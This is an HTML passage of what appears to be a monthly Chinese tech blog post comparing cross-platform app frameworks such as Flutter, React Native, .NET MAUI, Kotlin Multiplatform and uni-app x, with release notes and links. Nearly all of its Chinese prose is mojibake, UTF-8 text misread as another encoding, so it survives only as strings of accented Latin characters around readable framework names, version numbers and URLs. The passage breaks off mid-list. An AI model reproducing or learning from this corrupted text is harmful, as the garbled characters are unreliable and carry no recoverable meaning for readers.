<p>è·¨å¹³å°ä¸å†åªæ˜¯å¤‡é€‰é¡¹ï¼Œè€Œæ˜¯ä¸ªäººå’Œå›¢é˜Ÿçš„å¿…é€‰é¡¹ã€‚ä½†é¢å¯¹Flutterçš„å…¨å¹³å°ä¸€è‡´ä½“éªŒã€React Nativeçš„æ–°æ¶æ„æ€§èƒ½çªç ´ã€uni-app xçš„åŸç”Ÿç¼–è¯‘èƒ½åŠ›ã€KMPçš„Composeå…¨æ ˆç»Ÿä¸€ï¼Œç©¶ç«Ÿè°æ‰æ˜¯2026å¹´çš„æœ€ä¼˜è§£ï¼Ÿ</p>
<p>å¦‚ä½•åœ¨è¿™ä¸ªAIé‡å¡‘ä»£ç çš„æ—¶ä»£ï¼ŒæŠŠæœ‰é™çš„èµ„æºå‘æŒ¥å‡ºæœ€å¤§çš„æ•ˆç‡ï¼Ÿ</p>
<p>è€åˆ˜æ¯ä¸ªæœˆä¸ºå¤§å®¶ç”»å‡ºæœ€æ–°çš„è·¨å¹³å°æŠ€æœ¯é€‰å‹åœ°å›¾ï¼Œå¸®ä½ å¿«é€Ÿåšå†³ç­–ã€‚</p>
<p>æœ¬æœˆï¼Œå„å¤§æ¡†æ¶åœ¨â€œåŸç”Ÿä½“éªŒâ€ä¸â€œAIææ•ˆâ€ä¸Šéƒ½æœ‰é‡ç£…æ›´æ–°ã€‚</p>
<hr/>
<h2 data-id="heading-0">1. 2025å¹´è·¨å¹³å°æŠ€æœ¯ç®€å•æ€»ç»“</h2>
<ul>
<li><strong>æ€§èƒ½ä»æ˜¯æ ¸å¿ƒ</strong></li>
</ul>
<p>2025å¹´ï¼Œå„ä¸ªæ¡†æ¶éƒ½åœ¨å¯»æ‰¾æ€§èƒ½çš„çªç ´ç‚¹ã€‚</p>
<p>Flutterå…¨é¢æ™®åŠImpellerå¼•æ“ï¼Œè§£å†³äº†æœ€åä¸€å…¬é‡Œçš„å¡é¡¿é—®é¢˜ã€‚</p>
<p>uni-app xå’ŒKMPåˆ™é€‰æ‹©äº†å¦å¤–ä¸€æ¡è·¯ï¼Œé€šè¿‡ç¼–è¯‘ä¸ºåŸç”Ÿä»£ç ï¼ˆNative Compilationï¼‰ï¼Œç›´æ¥ä»ç‰©ç†å±‚é¢æ¶ˆé™¤äº†æ€§èƒ½é¸¿æ²Ÿã€‚</p>
<p>RNåˆ™å…¨é¢åˆ‡æ¢åˆ°æ–°æ¶æ„æ¥å®ç°æ€§èƒ½çš„çªç ´ã€‚</p>
<p>æ€§èƒ½ä¸Šå‘åŸç”Ÿçœ‹é½æ˜¯2025å¹´è·¨å¹³å°æŠ€æœ¯çš„ä¸€ä¸ªé‡è¦è¶‹åŠ¿ã€‚</p>
<ul>
<li><strong>å¹³å°æ‹¼å›¾è¡¥å…¨</strong></li>
</ul>
<p>æ¡†æ¶ä»¬ä¸å†æ»¡è¶³äºèƒ½è·‘ï¼Œè€Œæ˜¯è¿½æ±‚å„ä¸ªå¹³å°çš„å®Œç¾é€‚é…ã€‚</p>
<p>Flutteråœ¨æ¡Œé¢ç«¯å’ŒWebç«¯ï¼ˆWasmï¼‰æŒç»­å‘åŠ›ï¼ŒçœŸæ­£å®ç°å…­ç«¯åŒæºã€‚</p>
<p>KMPæ¨å‡ºäº†Kotlin-to-Swiftå¯¼å‡ºåŠŸèƒ½ï¼Œè®©iOSå¼€å‘è€…ä¹Ÿèƒ½ä¼˜é›…åœ°æ¥å…¥ï¼Œå¡«è¡¥äº†è·¨å¹³å°åœ¨iOSåŸç”Ÿç”Ÿæ€ä¸Šçš„æœ€åä¸€å—æ‹¼å›¾ã€‚</p>
<ul>
<li><strong>AIä¸æ¡†æ¶æ·±åº¦èåˆ</strong></li>
</ul>
<p>AIä¸å†åªæ˜¯å¤–éƒ¨è¾…åŠ©ï¼Œè€Œæ˜¯å¼€å§‹è¿›å…¥æ¡†æ¶å†…éƒ¨ã€‚</p>
<p>Flutteræ¨å‡ºçš„Dart MCP Serverè®©AIèƒ½ç›´æ¥ç†è§£é¡¹ç›®ç»“æ„å’Œç»„ä»¶æ ‘ã€‚</p>
<p>MAUIä¹Ÿåœ¨ä¸æ–­å®Œå–„å…¶AIåŠŸèƒ½ï¼Œå¦‚Copilot Agentï¼Œè¯•å›¾é€šè¿‡AIèµ‹èƒ½æ¥æ”¹å–„å¼€å‘è€…ä½“éªŒã€‚</p>
<p>åº”è¯¥è¯´æˆ‘ä»¬ç¦»æè¿°å³åº”ç”¨çš„æ—¶ä»£ä¸è¿œäº†ã€‚</p>
<h2 data-id="heading-1">2. æœ€æ–°æŠ€æœ¯åŠ¨æ€</h2>
<h3 data-id="heading-2">2.1 React Native æ–°æ¶æ„å…¨é¢å¯ç”¨</h3>
<p>React Native 0.83 å‘å¸ƒæ—¥å¿—: <a href="https://link.juejin.cn?target=https%3A%2F%2Freactnative.dev%2Fblog" target="_blank" title="https://reactnative.dev/blog" ref="nofollow noopener noreferrer">reactnative.dev/blog</a></p>
<p>React Native 0.83 ç‰ˆæœ¬éš Expo SDK 55 æ­£å¼åˆ°æ¥ã€‚æ–°æ¶æ„ï¼ˆNew Architectureï¼‰å·²æˆä¸ºé»˜è®¤æ ‡å‡†ï¼Œé—ç•™æ¶æ„ä»£ç æ­£åœ¨è¢«åŠ é€Ÿç§»é™¤ã€‚æ–°ç‰ˆæœ¬é›†æˆäº† React 19.2ï¼Œå¹¶åœ¨æ„å»ºæ—¶é—´å’Œåº”ç”¨ä½“ç§¯ä¸Šå–å¾—äº†æ˜¾è‘—ä¼˜åŒ–ã€‚å¼€å‘è€…ç°åœ¨å¯ä»¥äº«å—åˆ°æ›´æ¥è¿‘åŸç”Ÿçš„æ€§èƒ½ä½“éªŒï¼Œä»¥åŠæ›´å¼ºå¤§çš„ DevTools æ”¯æŒã€‚</p>
<h3 data-id="heading-3">2.2 Kotlin Multiplatform ç”Ÿæ€æˆç†ŸåŠ é€Ÿ</h3>
<p>Kotlin 2.3.20-Beta1 æ–°ç‰¹æ€§: <a href="https://link.juejin.cn?target=https%3A%2F%2Fkotlinlang.org%2Fdocs%2Fwhatsnew-eap.html" target="_blank" title="https://kotlinlang.org/docs/whatsnew-eap.html" ref="nofollow noopener noreferrer">kotlinlang.org/docs/whatsnâ€¦</a></p>
<p>Kotlin 2.3.20-Beta1 äºæœ¬æœˆå‘å¸ƒï¼Œæ ‡å¿—ç€ KMP ç”Ÿæ€çš„è¿›ä¸€æ­¥æˆç†Ÿã€‚</p>
<p>Compose Multiplatform for iOS å·²ç»ç¨³å®šï¼Œè¶Šæ¥è¶Šå¤šçš„å›¢é˜Ÿå¼€å§‹ä»åŸç”Ÿè½¬å‘ KMPã€‚</p>
<p>K2 ç¼–è¯‘å™¨çš„å…¨é¢æ™®åŠä»¥åŠ JetBrains åœ¨ AI è¾…åŠ©å¼€å‘ï¼ˆå¦‚ Koog å’Œ Mellumï¼‰ä¸Šçš„æŠ•å…¥ï¼Œä½¿å¾— KMP çš„å¼€å‘æ•ˆç‡è¾¾åˆ°äº†æ–°é«˜åº¦ã€‚</p>
<h3 data-id="heading-4">2.3 .NET MAUI ä¼ä¸šçº§å‘å±•</h3>
<p>.NET MAUI Roadmap: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdotnet%2Fmaui%2Fwiki%2FRoadmap" target="_blank" title="https://github.com/dotnet/maui/wiki/Roadmap" ref="nofollow noopener noreferrer">github.com/dotnet/mauiâ€¦</a></p>
<p>.NET 11çš„è§„åˆ’å’Œæ—©æœŸè¿­ä»£æ­£åœ¨è¿›è¡Œä¸­ã€‚å½“å‰é‡ç‚¹ä¾ç„¶æ˜¯æå‡äº§å“è´¨é‡å’Œæ€§èƒ½ç¨³å®šæ€§ã€‚å¾®è½¯æ­£åœ¨æ·±åº¦é›†æˆ GitHub Copilot å’Œ Copilot Agentï¼Œè¯•å›¾é€šè¿‡ AI èµ‹èƒ½æ¥æ”¹å–„ MAUI çš„å¼€å‘è€…ä½“éªŒã€‚å°½ç®¡ç¤¾åŒºä»æœ‰å…³äºç¨³å®šæ€§çš„è®¨è®ºï¼Œä½†å…¶åœ¨ä¼ä¸šçº§å¸‚åœºçš„åœ°ä½ä¾ç„¶ç¨³å›ºã€‚</p>
<h3 data-id="heading-5">2.4 Flutter å¹³å°æ›´æ–°</h3>
<p>Flutter æœ€æ–°åŠ¨æ€: <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.flutter.dev%2Frelease%2Fwhats-new" target="_blank" title="https://docs.flutter.dev/release/whats-new" ref="nofollow noopener noreferrer">docs.flutter.dev/release/whaâ€¦</a></p>
<p>è™½ç„¶ç¤¾åŒºå¯¹ Flutter 4.0 å……æ»¡æœŸå¾…ï¼Œä½†æˆªæ­¢ 2026 å¹´ 1 æœˆï¼Œ<strong>Flutter 3.38</strong> ä»æ˜¯å®˜æ–¹ç»´æŠ¤çš„æœ€æ–°ç¨³å®šç‰ˆæœ¬ã€‚ç›®å‰çš„æ›´æ–°é‡ç‚¹åœ¨äº <strong>Impeller æ¸²æŸ“å¼•æ“</strong> çš„è¿›ä¸€æ­¥ä¼˜åŒ–ä¸ç¨³å®šæ€§æå‡ï¼Œè¯¥å¼•æ“ç°å·²åœ¨ iOS å’Œ Android ä¸Šé»˜è®¤å¯ç”¨ï¼Œå½»åº•è§£å†³äº† shader ç¼–è¯‘é€ æˆçš„å¡é¡¿é—®é¢˜ã€‚æ­¤å¤–ï¼ŒFlutter å›¢é˜Ÿä¿®å¤äº† Android ç«¯ Activity é”€æ¯æ—¶çš„å†…å­˜æ³„æ¼é—®é¢˜ï¼Œå¹¶å¯¹ Android 15 çš„ 16KB Page Size æä¾›äº†å®Œæ•´æ”¯æŒï¼Œç»§ç»­å·©å›ºå…¶åœ¨è·¨å¹³å°æ¸²æŸ“ä¸€è‡´æ€§ä¸Šçš„ä¼˜åŠ¿ã€‚</p>
<h3 data-id="heading-6">2.5 uni-app x è¿›å±•</h3>
<p>uni-app x æ›´æ–°æ—¥å¿—: <a href="https://link.juejin.cn?target=https%3A%2F%2Funiapp.dcloud.net.cn%2Frelease.html" target="_blank" title="https://uniapp.dcloud.net.cn/release.html" ref="nofollow noopener noreferrer">uniapp.dcloud.net.cn/release.htmâ€¦</a></p>
<p>è¿‘æœŸ uni-app x è¿æ¥äº†ä¸€ç³»åˆ—é‡è¦æ›´æ–°ï¼ˆv4.87ï¼‰ã€‚æ ¸å¿ƒäº®ç‚¹åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>å¤šçº¿ç¨‹èƒ½åŠ›å¢å¼º</strong>
æ–°å¢ <code>uni.createWorker</code> APIï¼Œæ­£å¼æ”¯æŒ Worker çº¿ç¨‹ï¼Œæ˜¾è‘—æå‡å¤æ‚è®¡ç®—åœºæ™¯ä¸‹çš„æ€§èƒ½è¡¨ç°ã€‚</li>
<li><strong>é¸¿è’™ç”Ÿæ€æ·±åº¦é€‚é…</strong>
å°†é€»è¾‘å±‚ JSVM è¿ç§»è‡³ç‹¬ç«‹å­çº¿ç¨‹ï¼Œå½»åº•è§£å†³ä¸»çº¿ç¨‹é˜»å¡é—®é¢˜ï¼›æ–°å¢å¾®ä¿¡ç™»å½•ã€åˆ†äº«åŠå±å¹•äº®åº¦è°ƒèŠ‚ç­‰åŸç”Ÿèƒ½åŠ›ã€‚</li>
<li><strong>æ–°è®¾å¤‡ä¸ç³»ç»Ÿå…¼å®¹</strong>
ä¿®å¤ Android 16KB é¡µå¤§å°æ¨¡å¼ä¸‹çš„å½•éŸ³é—®é¢˜ï¼Œå¹¶æå‰é€‚é… iPhone 17 ç³»åˆ—æœºå‹ã€‚</li>
</ul>
<h3 data-id="heading-7">2.6 Valdi è¿›å±•</h3>
<p>Valdi GitHub ä»“åº“: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSnapchat%2FValdi" target="_blank" title="https://github.com/Snapchat/Valdi" ref="nofollow noopener noreferrer">github.com/Snapchat/Vaâ€¦</a></p>
<p>æœ¬æœˆValdiæ¡†æ¶æ²¡æœ‰æ–°çš„è¿›å±•ï¼Œæœ€æ–°å‘å¸ƒç‰ˆæœ¬ä»ç„¶æ˜¯beta-0.0.1</p>
<p>æ¥ä¸‹æ¥è€åˆ˜æŒ‰ç…§è·¨å¹³å°æŠ€æœ¯æ¡†æ¶çš„ä¸‰ç§è·¯çº¿ï¼Œåˆ†åˆ«ä»‹ç»ä¸€ä¸‹ç›®å‰ä¸»æµçš„è·¨å¹³å°æŠ€æœ¯ã€‚</p>
<hr/>
<h2 data-id="heading-8">3. è‡ªæ¸²æŸ“ç±»æ¡†æ¶</h2>
<p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯æ¡†æ¶è‡ªå·±æºå¸¦æ¸²æŸ“å¼•æ“ï¼Œè‡ªå·±ç”»ç•Œé¢ï¼Œä¸ç”¨ç³»ç»Ÿæä¾›çš„ç»„ä»¶ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ac5366533ca4bd6bd67eb742355ca8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6ICB5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769592963&amp;x-signature=p9QlSX5grX9AQZCf7ibxEegqJAY%3D" alt=" " loading="lazy"/></p>
<p>è¿™æ ·åšæœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ</p>
<ul>
<li><strong>ç•Œé¢å®Œå…¨ä¸€è‡´</strong>
UIæ¸²æŸ“ä¸ä¾èµ–ç³»ç»Ÿç»„ä»¶ï¼Œå¤šç«¯å±•ç¤ºæ•ˆæœå®Œå…¨ç»Ÿä¸€ã€‚</li>
<li><strong>æ€§èƒ½åª²ç¾åŸç”Ÿ</strong>
è·³è¿‡ç³»ç»ŸUIå±‚ç›´æ¥æ“ä½œGPUç»˜åˆ¶ï¼Œæ¶æ„ä¸åŸç”Ÿä¸€è‡´ã€‚</li>
<li><strong>æ— å…¼å®¹æ€§Bug</strong>
ä¸è°ƒç”¨ç³»ç»ŸåŸç”Ÿç»„ä»¶ï¼Œè§„é¿äº†å› ç³»ç»Ÿå·®å¼‚å¯¼è‡´çš„å…¼å®¹æ€§é—®é¢˜ã€‚</li>
</ul>
<h3 data-id="heading-9">3.1 Flutter</h3>
<p>2024å¹´Stack Overflowè°ƒæŸ¥æ˜¾ç¤ºï¼ŒFlutteræ˜¯æœ€å—æ¬¢è¿çš„è·¨å¹³å°æ¡†æ¶ã€‚</p>
<p>å…¨çƒæœ‰è¶…è¿‡500ä¸‡å¼€å‘è€…åœ¨ä½¿ç”¨ã€‚</p>
<p>è¿é˜¿é‡Œå·´å·´ã€è…¾è®¯ã€å­—èŠ‚è·³åŠ¨éƒ½åœ¨ä½¿ç”¨Flutterã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¿™ä¹ˆå¤šå¤§å‚é€‰æ‹©Flutterï¼Ÿ</strong></p>
<ul>
<li>
<p><strong>æ€§èƒ½å¼ºåŠ²</strong>
åˆ‡æ¢Impellerå¼•æ“åï¼ŒFlutteræ€§èƒ½å·²ä¸åŸç”Ÿåº”ç”¨ä¸€è‡´ã€‚</p>
</li>
<li>
<p><strong>å¼€å‘é«˜æ•ˆ</strong>
çƒ­é‡è½½å®ç°ç§’çº§é¢„è§ˆï¼ŒDartè¯­è¨€åœ¨åŠŸèƒ½æ€§ä¸å¤æ‚åº¦é—´è¾¾æˆå®Œç¾å¹³è¡¡ã€‚</p>
</li>
<li>
<p><strong>ç”Ÿæ€æˆç†Ÿ</strong>
pub.devæ‹¥æœ‰è¶…4ä¸‡æ’ä»¶ï¼Œæ¶µç›–åœ°å›¾ã€æ”¯ä»˜ç­‰å„ç±»åŠŸèƒ½ï¼Œå¼€ç®±å³ç”¨ã€‚</p>
</li>
<li>
<p><strong>æµ‹è¯•å‹å¥½</strong>
æ‹¥æœ‰å®¢æˆ·ç«¯é¢†åŸŸæœ€ä½³çš„å•å…ƒæµ‹è¯•æ”¯æŒï¼Œæ˜¯TDDåŠæ•æ·å›¢é˜Ÿçš„æœ€ä¼˜é€‰æ‹©ã€‚</p>
</li>
<li>
<p><strong>æ‹¥æŠ±AI</strong></p>
<ul>
<li><strong>AI Toolkit</strong>
é›†æˆGemini APIï¼Œå¿«é€Ÿå®ç°èŠå¤©ã€è¯†åˆ«ç­‰åŠŸèƒ½ã€‚</li>
<li><strong>æœ¬åœ°éƒ¨ç½²</strong>
æ”¯æŒTensorFlow Lite/ONNXï¼Œä¿éšœéšç§å®‰å…¨ã€‚</li>
<li><strong>Dart MCP Server</strong>
è®©AIåŠ©æ‰‹ç›´æ¥ç†è§£é¡¹ç›®ï¼Œè¾…åŠ©ç¼–ç ä¸è°ƒè¯•ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-10">4. ä¸­é—´å±‚ç±»æ¡†æ¶</h2>
<p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯åœ¨ä½ çš„ä»£ç å’Œç³»ç»ŸåŸç”Ÿç»„ä»¶ä¹‹é—´ï¼ŒåŠ äº†ä¸€ä¸ª"ç¿»è¯‘å®˜"ã€‚</p>
<p>æ¯”å¦‚ä½ ç”¨JavaScriptå†™ç•Œé¢é€»è¾‘ï¼Œæ¡†æ¶å¸®ä½ ç¿»è¯‘æˆåŸç”Ÿçš„Buttonã€TextViewã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e196cfdc1934937ba904c0b45952ca9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6ICB5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769592963&amp;x-signature=LZWF5bzu1qmsxLa1%2BcVllCSF56U%3D" alt=" " loading="lazy"/></p>
<p><strong>æ ¸å¿ƒç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>æˆç†Ÿçš„å¼€å‘ä½“éªŒ</strong>
å¤ç”¨React/Vue/C#ç­‰ç”Ÿæ€æˆç†Ÿçš„å¼€å‘æ€è·¯ï¼Œä¸Šæ‰‹å¿«ï¼Œå­¦ä¹ æˆæœ¬ä½ã€‚</li>
<li><strong>åŸç”Ÿç»„ä»¶æ¸²æŸ“</strong>
æœ€ç»ˆæ˜ å°„ä¸ºç³»ç»ŸåŸç”Ÿç»„ä»¶ï¼ŒUIç¬¦åˆå¹³å°è§„èŒƒï¼Œè´¨æ„ŸåŸç”Ÿã€‚</li>
<li><strong>æ¡¥æ¥æ€§èƒ½æŸè€—</strong>
é€šè¿‡ä¸­é—´å±‚ä¸åŸç”Ÿé€šä¿¡å­˜åœ¨"ç¿»è¯‘"å¼€é”€ï¼Œäº¤äº’å¯†é›†åœºæ™¯æ€§èƒ½ç¨å¼±ï¼Œå¸¸è§„ç•Œé¢æ— æ„ŸçŸ¥ã€‚</li>
</ul>
<h3 data-id="heading-11">4.1 React Native</h3>
<p>React Nativeæ˜¯ç¬¬äºŒå—æ¬¢è¿çš„è·¨å¹³å°æ¡†æ¶ï¼Œæ˜¯Facebookå¼€æºçš„é¡¹ç›®ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¿™ä¹ˆå¤šäººé€‰æ‹©React Nativeï¼Ÿ</strong></p>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>é›¶é—¨æ§›ä¸Šæ‰‹</strong>
Reactå¼€å‘è€…å¯ç›´æ¥å¤ç”¨JSXã€ç»„ä»¶åŒ–åŠçŠ¶æ€ç®¡ç†ç»éªŒï¼Œä¸€å‘¨å³å¯è½¬å‹ã€‚</li>
<li><strong>ç”Ÿæ€åºå¤§</strong>
npmæ‹¥æœ‰è¶…15ä¸‡ç›¸å…³åŒ…ï¼Œå…±äº«Webç”Ÿæ€ï¼Œå¯¼èˆªã€æ”¯ä»˜ç­‰åº“åº”æœ‰å°½æœ‰ã€‚</li>
<li><strong>åŠ¨æ€çƒ­æ›´æ–°</strong>
æ”¯æŒä¸å‘å¸ƒæ–°ç‰ˆæœ¬Appç›´æ¥åœ¨çº¿æ›´æ–°ï¼Œæ— éœ€å‘ç‰ˆå³å¯ä¿®å¤Bugæˆ–ä¸Šçº¿æ–°åŠŸèƒ½ï¼Œè¿­ä»£æå¿«ã€‚</li>
<li><strong>æ¶æ„å‡çº§</strong>
MetaæŒç»­æŠ•å…¥ï¼Œæ–°æ¶æ„å¼•å…¥Fabricå’ŒTurboModulesï¼Œæ€§èƒ½æå‡30%ï¼Œæ—§æ¶æ„å·²é€€å½¹ã€‚</li>
</ul>
<h3 data-id="heading-12">4.2 .NET MAUI</h3>
<p>2024å¹´5æœˆï¼Œå¾®è½¯æ­£å¼åœæ­¢äº†Xamarinçš„æ”¯æŒï¼Œ.NET MAUIï¼ˆMulti-platform App UIï¼‰æˆä¸ºå¾®è½¯å®˜æ–¹çš„è·¨å¹³å°è§£å†³æ–¹æ¡ˆã€‚</p>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>ä¼ä¸šçº§ä¿éšœ</strong>
å¾®è½¯æä¾›é•¿æœŸæŠ€æœ¯æ”¯æŒï¼ˆLTSï¼‰ï¼Œç¡®ä¿ä¼ä¸šåº”ç”¨æ‰€éœ€çš„ç¨³å®šæ€§ã€‚</li>
<li><strong>æ•°æ®å¤„ç†å¼º</strong>
C#æ“…é•¿å¤„ç†å¤æ‚ä¸šåŠ¡é€»è¾‘ï¼Œç‰¹åˆ«é€‚åˆé‡‘èã€ERPç­‰æ•°æ®å¯†é›†å‹åº”ç”¨ã€‚</li>
<li><strong>ç”Ÿæ€æ·±åº¦é›†æˆ</strong>
ä¸Azureã€SQL Serverç­‰å¾®è½¯å…¨å®¶æ¡¶æ— ç¼å¯¹æ¥ï¼Œé›†æˆä½“éªŒæœ€ä½³ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-13">5. è½¬è¯‘ç±»æ¡†æ¶</h2>
<p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯æŠŠä½ å†™çš„é«˜çº§è¯­è¨€ä»£ç ï¼Œ"ç¿»è¯‘"æˆç›®æ ‡å¹³å°çš„åŸç”Ÿä»£ç ã€‚</p>
<p>æ¯”å¦‚ä½ ç”¨Kotlinå†™ä¸šåŠ¡é€»è¾‘ï¼Œæ¡†æ¶å¸®ä½ "ç¿»è¯‘"æˆiOSçš„Swiftä»£ç ã€‚</p>
<p>æˆ–è€…ä½ ç”¨ç±»TypeScriptçš„è¯­æ³•å†™ç•Œé¢ï¼Œæ¡†æ¶å¸®ä½ "ç¿»è¯‘"æˆAndroidçš„Kotlinå’ŒiOSçš„Swiftã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a3be51e4c05b4708b7a4a24e1702d7dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6ICB5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769592963&amp;x-signature=lLFw6%2FAXGcvzr9xcSXTJ6XRbhe4%3D" alt="" loading="lazy"/></p>
<p><strong>æ ¸å¿ƒç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>æ€§èƒ½æ¥è¿‘åŸç”Ÿ</strong></li>
</ul>
<p>å› ä¸ºæœ€ç»ˆè¿è¡Œçš„å°±æ˜¯åŸç”Ÿä»£ç ï¼Œæ²¡æœ‰ä»»ä½•ä¸­é—´å±‚æŸè€—ã€‚</p>
<p>å°±åƒä½ ç›´æ¥ç”¨Swiftå†™iOSåº”ç”¨ï¼Œç”¨Kotlinå†™Androidåº”ç”¨ä¸€æ ·ã€‚</p>
<ul>
<li><strong>èƒ½äº«å—åŸç”Ÿç”Ÿæ€</strong></li>
</ul>
<p>è½¬è¯‘åçš„ä»£ç å¯ä»¥ç›´æ¥è°ƒç”¨å¹³å°çš„æ‰€æœ‰APIã€‚</p>
<ul>
<li><strong>è½¬è¯‘æ•ˆæœå¯èƒ½ä¸å®Œç¾</strong></li>
</ul>
<p>æ¯•ç«Ÿæ˜¯æœºå™¨"ç¿»è¯‘"çš„ä»£ç ï¼Œæœ‰æ—¶å€™å¯èƒ½ä¸å¦‚æ‰‹å†™çš„åŸç”Ÿä»£ç ä¼˜é›…ã€‚</p>
<p>ç‰¹åˆ«æ˜¯å¤æ‚çš„ä¸šåŠ¡é€»è¾‘ï¼Œè½¬è¯‘åçš„ä»£ç å¯èƒ½éœ€è¦äººå·¥ä¼˜åŒ–ã€‚</p>
<p>ä½†è¿™ä¸ªé—®é¢˜éšç€AIæŠ€æœ¯çš„å‘å±•ï¼Œæ­£åœ¨å¿«é€Ÿæ”¹å–„ã€‚</p>
<h3 data-id="heading-14">5.1 Kotlin Multiplatform (KMP)</h3>
<p>KMPçš„æ ¸å¿ƒç”¨æ³•ï¼šä¸šåŠ¡é€»è¾‘ç”¨KMPå…±äº«ï¼ŒUIç”¨Compose Multiplatformç»Ÿä¸€å¼€å‘</p>
<p>è¿™æ˜¯KMPçš„æœ€æ–°å‘å±•æ–¹å‘ï¼Œç»“åˆäº†Compose Multiplatformçš„å¼ºå¤§èƒ½åŠ›ã€‚</p>
<p>ä¸€å¥—Composeä»£ç å¯ä»¥è¿è¡Œåœ¨Androidã€iOSã€Desktopã€Webç­‰æ‰€æœ‰å¹³å°ã€‚</p>
<p><strong>KMPçš„ç‰¹ç‚¹</strong></p>
<ul>
<li><strong>çœŸæ­£çš„ä¸€å¥—ä»£ç å¤šå¹³å°</strong></li>
</ul>
<p>ä¸ä»…ä¸šåŠ¡é€»è¾‘å…±äº«ï¼ŒUIä¹Ÿå¯ä»¥å…±äº«ï¼Œå¼€å‘æ•ˆç‡å¤§å¹…æå‡ã€‚</p>
<ul>
<li><strong>ä¿æŒåŸç”Ÿæ€§èƒ½</strong></li>
</ul>
<p>Compose Multiplatformåœ¨å„å¹³å°éƒ½ç¼–è¯‘ä¸ºåŸç”Ÿä»£ç ï¼Œæ€§èƒ½æ¥è¿‘åŸç”Ÿåº”ç”¨ã€‚</p>
<ul>
<li><strong>æŠ€æœ¯æ ˆç»Ÿä¸€</strong></li>
</ul>
<p>å…¨éƒ¨ä½¿ç”¨Kotlinç”Ÿæ€ï¼Œå­¦ä¹ æˆæœ¬æ›´ä½ï¼Œå›¢é˜Ÿåä½œæ›´é«˜æ•ˆã€‚</p>
<ul>
<li><strong>æ¸è¿›å¼è¿ç§»</strong></li>
</ul>
<p>ä½ ä¸éœ€è¦é‡å†™æ•´ä¸ªåº”ç”¨ï¼Œå¯ä»¥å…ˆä»ä¸€ä¸ªæ¨¡å—å¼€å§‹ã€‚</p>
<p>æ¯”å¦‚å…ˆæŠŠç½‘ç»œå±‚ç”¨KMPé‡å†™ï¼Œç„¶åé€æ­¥è¿ç§»UIåˆ°Compose Multiplatformã€‚</p>
<ul>
<li><strong>ç”Ÿæ€ä»éœ€å®Œå–„</strong></li>
</ul>
<p>ç”Ÿæ€ä»åœ¨åŠ é€Ÿå»ºè®¾ï¼Œæ³¨æ„ç‰ˆæœ¬å…¼å®¹ä¸æ’ä»¶æˆç†Ÿåº¦ï¼Œç¬¬ä¸‰æ–¹åº“ç›¸å¯¹è¾ƒå°‘ï¼Œä½†å‘å±•å¾ˆå¿«ã€‚</p>
<h3 data-id="heading-15">5.2 uni-app / uni-app x</h3>
<p><strong>ä¼ ç»Ÿuni-app</strong>
åŸºäºVue.js + JavaScriptï¼Œæ›´é€‚ç”¨äºå°ç¨‹åºå¼€å‘</p>
<p><strong>uni-app x</strong>
å…¨æ–°æ¶æ„ï¼Œä½¿ç”¨UTSè¯­è¨€ï¼Œæ€§èƒ½è¾¾åˆ°åŸç”Ÿçº§åˆ«</p>
<p><strong>uni-app xçš„æŠ€æœ¯ç‰¹ç‚¹</strong></p>
<ul>
<li><strong>å¹³å°æ”¯æŒæœ€å…¨</strong></li>
</ul>
<p>ä¸€å¥—ä»£ç å¯ä»¥å‘å¸ƒåˆ°ï¼šiOSã€Androidã€Webã€å„ç§å°ç¨‹åºã€å¿«åº”ç”¨ã€é¸¿è’™...</p>
<p>æ€»å…±æ”¯æŒ14+ä¸ªå¹³å°ï¼Œè¿™æ˜¯å…¶ä»–æ¡†æ¶åšä¸åˆ°çš„ã€‚</p>
<ul>
<li><strong>å°ç¨‹åºä¼˜å…ˆçš„è®¾è®¡ç†å¿µ</strong></li>
</ul>
<p>å¦‚æœä½ çš„äº§å“éœ€è¦åŒæ—¶æ”¯æŒAppå’Œå°ç¨‹åºï¼Œuni-appå‡ ä¹æ˜¯å”¯ä¸€çš„é€‰æ‹©ã€‚</p>
<p>å…¶ä»–æ¡†æ¶éƒ½æ˜¯Appä¼˜å…ˆã€‚</p>
<ul>
<li><strong>å›½äº§åŒ–æ”¯æŒ</strong></li>
</ul>
<p>å¯¹é¸¿è’™ã€ä¿¡åˆ›ç­‰å›½äº§åŒ–å¹³å°æ”¯æŒæœ€å¥½ã€‚</p>
<p>è¿™å¯¹å›½å†…ä¼ä¸šæ¥è¯´éå¸¸é‡è¦ã€‚</p>
<ul>
<li>
<p><strong>uni-appçš„å±€é™</strong></p>
<p><strong>ç”Ÿæ€ç›¸å¯¹å°é—­</strong>
ä¸»è¦ä¾èµ–DCloudçš„ç”Ÿæ€
<strong>å›½é™…åŒ–ç¨‹åº¦ä½</strong>
æµ·å¤–å¼€å‘è€…ä½¿ç”¨è¾ƒå°‘
